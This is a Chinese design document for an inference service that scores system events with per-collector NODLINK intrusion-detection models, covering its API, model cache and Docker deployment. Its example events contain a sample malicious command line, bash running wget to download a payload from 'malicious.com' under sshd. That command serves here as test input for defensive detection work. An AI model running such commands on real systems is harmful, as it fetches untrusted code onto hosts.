# SysArmor ML Inference Service 设计文档

## 1. 概述

基于现有 `sysarmor-nodlink-api` 的设计，创建一个支持多 collector 模型的推理服务。服务设计为无状态、可水平扩展，支持从不同目录加载对应 collector 的模型。

### 1.1 核心特性

- **多模型管理**: 支持同时管理多个 collector 的 NODLINK 模型
- **简单缓存**: 基于内存的模型缓存，避免重复加载
- **无状态设计**: 支持水平扩展和负载均衡
- **兼容现有API**: 基于现有 nodlink API 的设计模式

### 1.2 与现有 nodlink API 的区别

| 特性 | 现有 nodlink API | 新推理服务 |
|------|------------------|------------|
| 模型管理 | 单一全局模型 | 多 collector 模型 |
| 模型加载 | 启动时加载 | 按需加载 + 缓存 |
| 请求参数 | 事件列表 | collector_id + 事件列表 |
| 扩展性 | 单实例 | 多实例水平扩展 |

## 2. 目录结构设计

### 2.1 项目结构

```
sysarmor-ml-inference/
├── app/
│   ├── main.py              # FastAPI 应用入口
│   ├── core/
│   │   ├── config.py        # 配置管理
│   │   └── logging.py       # 日志配置
│   ├── models/
│   │   ├── request.py       # 请求模型
│   │   └── response.py      # 响应模型
│   └── services/
│       ├── model_manager.py # 模型管理服务
│       └── inference_service.py # 推理服务
├── requirements.txt
└── Dockerfile
```

### 2.2 模型存储目录结构

```
/data/models/
├── collector_001/
│   ├── models/              # NODLINK 预训练模型
│   │   ├── AE.model
│   │   ├── cmdline-embedding.model
│   │   ├── filepath-embedding.model
│   │   ├── stability-embedding.json
│   │   └── tfidf.json
│   └── metadata.json       # 模型元数据
├── collector_002/
    ├── models/
    └── metadata.json
```

## 3. API 设计

### 3.1 推理接口

#### 批量推理 (主要接口)

```http
POST /predict
Content-Type: application/json

{
  "collector_id": "collector_001",
  "events": [
    {
      "evt.type": "execve",
      "proc.name": "bash",
      "proc.cmdline": "/bin/bash -c 'wget http://malicious.com'",
      "proc.pcmdline": "/usr/sbin/sshd",
      "evt.time": 1699123456.789,
      "fd.name": "/tmp/payload"
    }
  ],
  "options": {
    "threshold": 0.7
  }
}
```

**响应格式:**
```json
{
  "success": true,
  "collector_id": "collector_001",
  "threat_score": 0.85,
  "is_malicious": true,
  "graph_data": {
    "nodes": [...],
    "edges": [...],
    "graph_score": 85.2
  },
  "alert_info": {
    "alert_status": 1,
    "alert_level": 1,
    "alert_uuid": "abc-123-def"
  },
  "processing_time": 0.25
}
```

#### 批量多 collector 推理

```http
POST /predict/batch
Content-Type: application/json

[
  {
    "collector_id": "collector_001",
    "events": [...]
  },
  {
    "collector_id": "collector_002", 
    "events": [...]
  }
]
```

### 3.2 模型管理接口

#### 列出可用模型

```http
GET /models
```

**响应:**
```json
{
  "models": [
    {
      "collector_id": "collector_001",
      "status": "loaded",
      "model_path": "/data/models/collector_001",
      "loaded_at": "2024-12-09T10:30:00Z",
      "metadata": {
        "version": "1.0",
        "trained_at": "2024-12-08T02:00:00Z"
      }
    }
  ]
}
```

#### 获取特定模型信息

```http
GET /models/{collector_id}
```

#### 预加载模型

```http
POST /models/{collector_id}/load
```

#### 卸载模型

```http
DELETE /models/{collector_id}/unload
```

### 3.3 健康检查和监控

#### 健康检查

```http
GET /health
```

**响应:**
```json
{
  "status": "healthy",
  "service": "sysarmor-ml-inference",
  "version": "1.0.0",
  "models_loaded": 5,
  "cache_stats": {
    "size": 5,
    "max_size": 10,
    "hit_ratio": 0.85
  }
}
```

#### 缓存统计

```http
GET /cache/stats
```

## 4. 核心组件设计

### 4.1 配置管理 (core/config.py)

```python
from pydantic import BaseSettings

class Settings(BaseSettings):
    # 服务配置
    host: str = "0.0.0.0"
    port: int = 8080
    
    # 模型配置
    models_base_path: str = "/data/models"
    default_threshold: float = 0.7
    
    # 缓存配置
    max_cached_models: int = 10
    model_cache_ttl: int = 3600  # 1小时
    
    # 日志配置
    log_level: str = "INFO"
    
    class Config:
        env_file = ".env"
        env_prefix = "INFERENCE_"
```

### 4.2 模型管理器 (services/model_manager.py)

**核心功能:**
- 模型路径管理和验证
- 简单的内存缓存 (LRU)
- 模型加载/卸载
- 模型元数据管理

**主要方法:**
```python
class ModelManager:
    def get_model_path(self, collector_id: str) -> str
    def load_model(self, collector_id: str) -> NodlinkService
    def unload_model(self, collector_id: str)
    def list_available_models() -> List[Dict]
    def get_model_info(self, collector_id: str) -> Dict
```

### 4.3 推理服务 (services/inference_service.py)

**核心功能:**
- 基于现有 `NodlinkService` 的推理逻辑
- 多模型管理和调度
- 请求路由到对应的 collector 模型

**主要方法:**
```python
class InferenceService:
    def __init__(self, model_manager: ModelManager)
    async def predict(self, collector_id: str, events: List[Dict]) -> ThreatResult
    async def predict_batch(self, requests: List[Dict]) -> List[ThreatResult]
```

## 5. 缓存设计 (简化版)

### 5.1 简单内存缓存

```python
from collections import OrderedDict
import time

class SimpleModelCache:
    def __init__(self, max_size: int = 10, ttl: int = 3600):
        self.max_size = max_size
        self.ttl = ttl
        self.cache = OrderedDict()  # LRU 缓存
        self.timestamps = {}
    
    def get(self, key: str):
        # 检查是否存在且未过期
        if key in self.cache and not self._is_expired(key):
            # 移动到末尾 (最近使用)
            self.cache.move_to_end(key)
            return self.cache[key]
        return None
    
    def put(self, key: str, value):
        # 如果缓存满了，移除最久未使用的
        if len(self.cache) >= self.max_size:
            oldest_key = next(iter(self.cache))
            self.remove(oldest_key)
        
        self.cache[key] = value
        self.timestamps[key] = time.time()
    
    def remove(self, key: str):
        self.cache.pop(key, None)
        self.timestamps.pop(key, None)
```

### 5.2 缓存策略

- **缓存键**: `collector_id`
- **缓存值**: `NodlinkService` 实例
- **过期策略**: TTL (1小时) + LRU
- **预热策略**: 可选的启动时预加载热门模型

## 6. 部署配置

### 6.1 Docker 部署

```dockerfile
FROM python:3.9-slim

WORKDIR /app

# 安装依赖
COPY requirements.txt .
RUN pip install -r requirements.txt

# 复制应用代码
COPY . .

# 创建模型目录
RUN mkdir -p /data/models

EXPOSE 8080

CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8080"]
```

### 6.2 Docker Compose

```yaml
version: '3.8'

services:
  sysarmor-ml-inference:
    build: .
    ports:
      - "8081:8080"
    environment:
      - INFERENCE_MODELS_BASE_PATH=/data/models
      - INFERENCE_MAX_CACHED_MODELS=10
      - INFERENCE_LOG_LEVEL=INFO
    volumes:
      - ./data/models:/data/models:ro
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 30s
      timeout: 10s
      retries: 3
    deploy:
      replicas: 2
```

## 7. 使用示例

### 7.1 基本推理

```bash
# 单个 collector 推理
curl -X POST "http://localhost:8081/predict" \
  -H "Content-Type: application/json" \
  -d '{
    "collector_id": "collector_001",
    "events": [
      {
        "evt.type": "execve",
        "proc.name": "bash",
        "proc.cmdline": "/bin/bash -c \"wget http://malicious.com/payload\"",
        "proc.pcmdline": "/usr/sbin/sshd",
        "evt.time": 1699123456.789
      },
      ...
    ]
  }'
```

### 7.2 模型管理

```bash
# 列出所有模型
curl "http://localhost:8081/models"

# 预加载模型
curl -X POST "http://localhost:8081/models/collector_001/load"

# 获取缓存统计
curl "http://localhost:8081/cache/stats"
```

## 8. 与现有系统集成

### 8.1 与 sysarmor-ml consumer 集成

```python
# sysarmor-ml consumer 调用推理服务
async def process_events_batch(collector_id: str, events: List[Dict]):
    async with httpx.AsyncClient() as client:
        response = await client.post(
            f"{INFERENCE_SERVICE_URL}/predict",
            json={
                "collector_id": collector_id,
                "events": events
            }
        )
        
        if response.status_code == 200:
            result = response.json()
            if result["is_malicious"]:
                # 写入告警到 OpenSearch
                await write_alert_to_opensearch(result)
```

### 8.2 告警格式

推理服务生成的告警直接兼容 OpenSearch 索引格式:

```json
{
  "alert_id": "nodlink_abc123",
  "timestamp": "2024-12-09T10:30:00Z",
  "collector_id": "collector_001",
  "threat_score": 0.85,
  "severity": "high",
  "detection_method": "nodlink",
  "graph_data": {...},
  "alert_info": {...}
}
```
